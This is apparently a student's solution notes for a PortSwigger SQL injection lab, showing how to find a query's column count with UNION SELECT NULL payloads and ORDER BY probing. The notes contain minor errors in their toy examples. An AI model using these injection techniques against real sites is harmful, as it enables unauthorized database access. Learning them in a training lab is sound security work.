# Lab 2 - # SQL injection UNION attack, determining the number of columns returned by the query

Lab - https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

SQL Injection - Product Category filter

End Goal - Determine the number of columns return by the query

**Solution:**

table1        table2
a | b             c | d
.........            ..........
1,2                2,3
3,4                4,5

Query 1: 
SELECT a, b from table1
1,2
3,4

Query 2:
SELECT a, b from table1 UNION select b, c from table2
1,2
3,4
2,3
4,5

SQLi attack (way #1)

select ? from table1 UNION select NULL 
- error- incorrect number of columns
select ? from table1 UNION select NULL, NULL, NULL 
- 200 response- correct number of tables

SQLi attack (way #2)

select a, b from table1 order by 3